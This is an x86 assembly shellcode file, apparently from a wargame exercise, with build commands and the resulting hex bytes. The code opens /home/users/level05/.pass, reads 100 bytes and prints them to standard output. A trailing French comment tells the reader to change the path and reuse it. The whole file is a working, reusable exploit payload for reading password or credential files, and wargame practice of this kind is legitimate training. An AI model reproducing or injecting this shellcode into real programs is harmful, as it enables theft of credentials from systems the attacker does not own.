
; nasm -felf -o shellcode.o shellcode.asm
; ld -melf_i386 shellcode.o -o shellcode

	segment .text
	global _start

_start:


	jmp two
one:
	mov al, 0x5
	pop ebx
	xor ecx, ecx
	xor edx, edx
	int 0x80

	sub esp, 100
	mov ebx, eax
	mov al, 0x3
	mov ecx, esp
	mov dl, 100
	int 0x80

	mov al, 0x4
	mov bl, 0x1
	mov ecx, esp
	mov dl, 100
	int 0x80
	ret

two:
	call one
	.string dd "/home/users/level05/.pass"


; "\xeb\x21\xb0\x05\x5b\x31\xc9\x31\xd2\xcd\x80"
; "\x83\xec\x64\x89\xc3\xb0\x03\x89\xe1\xb2\x64"
; "\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x64\xcd"
; "\x80\xc3\xe8\xda\xff\xff\xff"
; "/home/users/level05/.pass" <- modifie juste cette partie et c bon!
